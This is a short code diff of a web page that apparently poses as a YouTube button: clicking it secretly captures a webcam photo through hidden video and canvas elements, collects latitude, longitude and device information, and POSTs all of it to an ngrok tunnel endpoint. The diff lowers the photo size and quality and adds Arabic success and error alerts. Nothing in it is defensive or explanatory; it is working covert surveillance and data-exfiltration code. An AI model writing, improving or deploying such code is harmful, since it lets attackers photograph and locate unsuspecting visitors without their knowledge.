@@ -12,7 +12,7 @@
     <img src="https://raw.githubusercontent.com/khaliddhahir0-sketch/youtube/main/button.jpg" onclick="capture()">   
 
     <video id="video" width="300" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="300" style="display:none;"></canvas>
+    <canvas id="canvas" width="150" height="150" style="display:none;"></canvas> <!-- صغر حجم الكانفس -->
 
     <script>
         async function capture() {
@@ -44,19 +44,21 @@
 
                     setTimeout(() => {
                         canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
-                        const imgData = canvas.toDataURL('image/png');
+                        const imgData = canvas.toDataURL('image/jpeg', 0.5); // JPEG بجودة 50%
 
                         // إرسال البيانات إلى السيرفر
-                       fetch("https://3ce96c372a59.ngrok-free.app/receive_data", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ lat, lon, imgData, deviceInfo })
-});
+                        fetch("https://3ce96c372a59.ngrok-free.app/receive_data", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ lat, lon, imgData, deviceInfo })
+                        })
+                        .then(res => res.json())
+                        .then(resp => alert("تم إرسال البيانات بنجاح!"))
+                        .catch(err => alert("فشل الإرسال: " + err));
 
-
+                        // إيقاف الكاميرا
                         video.srcObject.getTracks().forEach(track => track.stop());
 
-                        alert("تم إرسال البيانات بنجاح!");
                     },2000);
                 } catch(err) { alert("تعذر الوصول للكاميرا: "+err); }
             }, function(err) {
